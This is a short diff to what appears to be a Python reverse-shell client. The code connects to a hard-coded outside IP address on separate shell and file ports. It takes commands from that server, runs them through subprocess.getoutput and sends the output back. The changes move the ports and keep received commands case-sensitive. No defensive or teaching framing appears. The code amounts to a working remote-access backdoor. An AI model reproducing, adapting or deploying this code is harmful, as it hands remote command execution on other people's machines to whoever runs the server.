@@ -4,8 +4,8 @@ import os
 import subprocess
 
 HEADER = 64
-PORT_SHELL = 87
-PORT_FILE = 88
+PORT_SHELL = 887
+PORT_FILE = 888
 SERVER = "127.0.0.1"
 SERVER = "46.101.213.187"
 FORMAT = "utf-8"
@@ -69,7 +69,7 @@ def main():
             command = ""
             output = ""
             try:
-                command = receive(client_shell).lower()
+                command = receive(client_shell)
             except socket.timeout:
                 break
             if command == "":
@@ -100,8 +100,6 @@ def main():
                 exit()
             # execute the command and retrieve the results
             output = subprocess.getoutput(command)
-            # get the current working directory as output
-            cwd = os.getcwd()
             # send the results back to the server
             send(client_shell, output)
         if command == "exit":
